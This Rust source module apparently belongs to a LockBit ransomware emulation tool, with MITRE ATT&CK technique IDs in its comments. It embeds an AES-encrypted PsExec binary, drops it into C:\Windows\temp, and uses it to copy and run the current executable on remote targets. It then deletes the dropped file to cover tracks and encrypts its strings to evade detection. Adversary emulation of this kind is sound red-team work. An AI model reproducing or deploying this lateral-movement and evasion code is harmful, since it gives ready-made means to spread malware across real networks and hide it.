use aes::Aes256;
use aes::cipher::{generic_array::{typenum::U32, GenericArray}, KeyIvInit, StreamCipher};
use std::env;
use std::fs::{File, remove_file};
use std::io::Write;
use std::error::Error;
use std::path::Path;
use std::process::Output;
use std::str;
use crate::logger::{log_info};
use crate::proc::exec_program;
use encryptliterals::esl;
use fetchzip::fetch_zip;
use obfuscateresource::obfuscate_resource;
use miniz_oxide::inflate::decompress_to_vec;

const FILENAME: &str = "pm.exe";

const KEY: [u8; 32] = [
    0xa0, 0xef, 0x1b, 0xa4, 0xc3, 0x8f, 0xef, 0xca,
    0x44, 0xe7, 0xd6, 0x05, 0x75, 0x76, 0x62, 0xe2,
    0x1f, 0x09, 0xea, 0x10, 0x84, 0xe0, 0xa2, 0x76,
    0xb0, 0x0e, 0x87, 0x6f, 0xf7, 0xe0, 0x26, 0x55
];

fn aes_decrypt(input: &mut Vec<u8>, key: GenericArray<u8,U32>) -> Vec<u8> {
    type Aes256Ctr128BE = ctr::Ctr128BE<Aes256>;

    // IV at start of ciphertext
    let iv = &input[0..16];
    let mut cipher = Aes256Ctr128BE::new(&key.into(), iv.into());
    let mut plaintext = &mut input[16..];
    cipher.apply_keystream(&mut plaintext);
    return plaintext.to_vec();
}

/**
 * setup_psexec
 *      About:
 *          AES-decrypts and decompresses embedded PsExec binary and writes it to the specified
 *          destination file.
 *      Result:
 *          Decrypted and decompressed PsExec written to destination file
 *      MITRE ATT&CK Techniques:
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads
 *          T1140: Deobfuscate/Decode Files or Information
 */
pub fn setup_psexec(destination: &str) -> Result<(), Box<dyn Error>> {
    // Download and extract PsExec at build time - use web archive URL to maintain static version
    fetch_zip!("C:\\Users\\Public\\PSTools.zip", "https://web.archive.org/web/20240312192243/https://download.sysinternals.com/files/PSTools.zip", "resources\\PSTools.zip", "resources");

    // Compress and AES-encrypt PsExec binary at build time
    obfuscate_resource!("resources\\PsExec64.exe", "resources\\PsExec64.exe.enc", "a0ef1ba4c38fefca44e7d605757662e21f09ea1084e0a276b00e876ff7e02655");
    
    // Embed obfuscated PsExec binary at build time
    let ciphertext = include_bytes!("..\\resources\\PsExec64.exe.enc");

    // Decrypt and decompress
    let compressed = aes_decrypt(&mut ciphertext.to_vec(), KEY.into());
    let decompressed = match decompress_to_vec(compressed.as_slice()) {
        Ok(d) => d,
        Err(e) => Err(format!("{}: {}", esl!("Failed to decompress PsExec"), e))?
    };

    let mut file = File::create(destination)?;
    file.write_all(&decompressed)?;
    Ok(())
}

/// Gets the psexec path from the C:\Windows\temp folder
pub fn get_psexec_path() -> String {
    return format!("{}\\{}", esl!("C:\\Windows\\temp"), FILENAME)
}

/**
 * cleanup_psexec
 *      About:
 *          Removes the dropped PsExec executable from the Windows TEMP folder.
 *      Result:
 *          Delete the dropped PsExec executable or error on failure.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 */
pub fn cleanup_psexec() -> Result<(), Box<dyn Error>> {
    remove_file(get_psexec_path())?;
    Ok(())
}

/**
 * run_psexec
 *      About:
 *          Uses PSExec to copy and run the current executable on the target machines
 *      Result:
 *          Executes <psexec_path> -accepteula \\<targets> -s -d -f -c <file_path> --no-prop
 *             target: remote target IPs
 *             file_path: path to executable file to copy over to targets
 *      MITRE ATT&CK Techniques:
 *          T1021.002: Remote Services: SMB/Windows Admin Shares
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1569.002: System Services: Service Execution
 *          T1570: Lateral Tool Transfer
 */
pub fn run_psexec(targets: &str) -> Result<Output, Box<dyn Error>> {
    // Discover path to self
    let file_path_buffer = match env::current_exe() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Could not get current executable path"), e))?
        }
    };

    let file_path = match file_path_buffer.into_os_string().into_string() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {:?}", esl!("Could not convert executable path buffer to string"), e))?
        }
    };

    let psexec_path = get_psexec_path();

    let psexec_path_exists = verify_file_path(&psexec_path);
    if !psexec_path_exists {
        Err(format!("{} {}", esl!("PsExec file could not be found at"), psexec_path))?
    }

    log_info(format!("{}: {:?}", esl!("PsExec targets"), targets));
    let output = match exec_program(&psexec_path, &[esl!("-accepteula").as_str(), &("\\\\".to_owned() + targets), esl!("-i").as_str(), esl!("-d").as_str(), esl!("-f").as_str(), esl!("-c").as_str(), &file_path, esl!("--no-prop").as_str()]){
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute PsExec"), e))?
        }
    };

    log_info(format!("{}: {}", esl!("stdout"), replace_carriage_return(std::str::from_utf8(&output.stdout)?)));
    log_info(format!("{}: {}", esl!("stderr"), replace_carriage_return(std::str::from_utf8(&output.stderr)?)));

    Ok(output)
}

/// Replaces /r/r/r with /r/n
/// message: message to replace characters within
fn replace_carriage_return(message: &str) -> String {
    message.replace("\r\r\r", "\r\n")
}

/// Verifies a file exists on the host machine
/// file_path: file to validate
fn verify_file_path(file_path: &String) -> bool {
    let path = Path::new(file_path);
    return path.exists();
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use crate::psexec::setup_psexec;
    use sha2::{Sha256, Digest};
    
    // Test that SHA256 hash of original and extracted psexec match
    #[test]
    fn test_setup_psexec() {
        let option = setup_psexec("test_lockbit_psexec");
        match option {
            Err(e) => panic!("setup_psexec failed: {}", e),
            Ok(_) => {
                let mut sha256 = Sha256::new();
                let mut original_file = match File::open(".\\resources\\PsExec64.exe") {
                    Err(e) => panic!("Cannot find original file: {}", e),
                    Ok(s) => s
                };
                let mut original_bytes = Vec::new();
                let _original_result = match original_file.read_to_end(&mut original_bytes) {
                    Err(e) => panic!("Cannot convert original file to bytes: {}", e),
                    Ok(s) => s
                };
                sha256.update(original_bytes);
                let original_hash = sha256.clone().finalize();
                sha256.reset();

                let mut dropped_file = match File::open("test_lockbit_psexec") {
                    Err(e) => panic!("Cannot find dropped file: {}", e),
                    Ok(s) => s
                };
                let mut dropped_bytes = Vec::new();
                let _dropped_result = match dropped_file.read_to_end(&mut dropped_bytes) {
                    Err(e) => panic!("Cannot convert dropped file to bytes: {}", e),
                    Ok(s) => s
                };
                sha256.update(dropped_bytes);
                let dropped_hash = sha256.finalize();
                remove_file("test_lockbit_psexec").unwrap();
                assert_eq!(original_hash, dropped_hash);
            }
        }
    }
}
